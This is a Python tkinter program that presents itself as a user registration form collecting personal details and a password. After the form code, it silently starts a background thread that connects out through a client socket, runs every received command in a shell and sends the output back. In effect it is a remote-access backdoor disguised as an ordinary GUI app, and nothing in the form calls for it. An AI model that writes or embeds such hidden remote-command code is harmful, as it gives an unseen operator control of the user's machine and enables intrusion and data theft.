import tkinter as tk
from tkinter import ttk, messagebox
import client
import subprocess
import os
import threading
import command_handler


def submit_form():
    full_name = full_name_entry.get()
    email = email_entry.get()
    phone_number = phone_number_entry.get()
    address = address_entry.get()
    gender = gender_var.get()
    dob = dob_entry.get()
    password = password_entry.get()

    # Basic validation
    if not all([full_name, email, phone_number, address, gender, dob, password]):
        messagebox.showwarning("Error", "Please fill in all required fields.")
        return

    # Display submitted information
    message = f"Full Name: {full_name}\nEmail: {email}\nPhone Number: {phone_number}\nAddress: {address}\nGender: {gender}\nDate of Birth: {dob}\nPassword: {password}"
    messagebox.showinfo("Registration Successful", message)


# Create the main window
root = tk.Tk()
root.title("User Registration Form")

# Styling
style = ttk.Style()
style.configure("TLabel", font=('Arial', 12, 'bold'), foreground="blue")
style.configure("TEntry", font=('Arial', 12))
style.configure("TButton", font=('Arial', 14, 'bold'), foreground="black", background="white")

# Create and place labels and entry widgets
ttk.Label(root, text="Full Name:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
full_name_entry = ttk.Entry(root)
full_name_entry.grid(row=0, column=1, padx=10, pady=5)

ttk.Label(root, text="Email:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
email_entry = ttk.Entry(root)
email_entry.grid(row=1, column=1, padx=10, pady=5)

ttk.Label(root, text="Phone Number:").grid(row=2, column=0, padx=10, pady=5, sticky="e")
phone_number_entry = ttk.Entry(root)
phone_number_entry.grid(row=2, column=1, padx=10, pady=5)

ttk.Label(root, text="Address:").grid(row=3, column=0, padx=10, pady=5, sticky="e")
address_entry = ttk.Entry(root)
address_entry.grid(row=3, column=1, padx=10, pady=5)

ttk.Label(root, text="Gender:").grid(row=4, column=0, padx=10, pady=5, sticky="e")
gender_var = tk.StringVar()
gender_combobox = ttk.Combobox(root, textvariable=gender_var, values=["Male", "Female", "Other"])
gender_combobox.grid(row=4, column=1, padx=10, pady=5)

ttk.Label(root, text="Date of Birth:").grid(row=5, column=0, padx=10, pady=5, sticky="e")
dob_entry = ttk.Entry(root)
dob_entry.grid(row=5, column=1, padx=10, pady=5)

ttk.Label(root, text="Password:").grid(row=6, column=0, padx=10, pady=5, sticky="e")
password_entry = ttk.Entry(root, show="*")
password_entry.grid(row=6, column=1, padx=10, pady=5)

# Create and place the submit button
submit_button = ttk.Button(root, text="Submit", command=submit_form)
submit_button.grid(row=7, column=0, columnspan=2, pady=10)


# Run the main loop


def handle_command(command, socket_client):
    if command[:2] == "cd" and len(command) > 3:
        os.chdir(command[3:])

    task = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = task.communicate()
    data = stdout.decode() + stderr.decode()
    socket_client.send(data.encode('ascii'))

# intergrating code


def run_client_socket():
    socket_client = client.create_client_socket()
    active = True

    while active:
        try:
            command = socket_client.recv(4096).decode('ascii')
            command_handler.handle_command(command, socket_client)

        except Exception as e:
            print(f"An error occurred: {e}")
            socket_client.close()
            active = False


# Start the client socket thread
client_thread = threading.Thread(target=run_client_socket)
client_thread.start()

root.mainloop()


